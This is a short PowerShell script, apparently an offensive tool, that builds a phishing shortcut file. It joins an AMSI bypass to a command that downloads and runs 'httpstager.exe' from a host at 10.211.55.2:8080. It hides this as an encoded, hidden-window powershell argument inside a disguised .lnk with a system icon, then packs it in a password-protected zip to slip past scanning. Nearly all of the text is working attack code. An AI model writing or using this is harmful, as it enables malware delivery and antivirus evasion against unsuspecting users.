#For executables as stagers 
#Malicious powershell commands
$amsibypass = '$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields("NonPublic,Static");Foreach($e in $d) {if ($e.Name -like "*InitFailed") {$f=$e}}$f.SetValue($null,$true);'
$url = "http://10.211.55.2:8080/httpstager.exe"
$dlpath = "$env:APPDATA\stager.exe"
$command = "Invoke-WebRequest -Uri '$url' -OutFile '$dlpath'; Start-Process '$dlpath'"
$payload = $amsibypass + $command
$enc_payload = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($payload))

#shortcut file commands
$path = "$([Environment]::GetFolderPath('Desktop'))\demo.lnk"
$wshell = New-Object -ComObject Wscript.Shell
$shortcut = $wshell.CreateShortcut($path)
$shortcut.IconLocation = "C:\Windows\System32\shell32.dll,70"
$shortcut.TargetPath = "powershell.exe"
$shortcut.Arguments = "-nop -w hidden -enc " + $enc_payload
$shortcut.WorkingDirectory = "C:"
$shortcut.Hotkey = "CTRL+C"
$shortcut.Description = "Demo"
$shortcut.WindowStyle = 7 
$shortcut.Save()

#7zip encryption commands
$password = ConvertTo-SecureString "Password123!" -AsPlainText -Force
Compress-7zip -Path $path -ArchiveFileName "demo.zip" -Format Zip - SecurePassword $password

#Cleanup of lnk file
rm $path
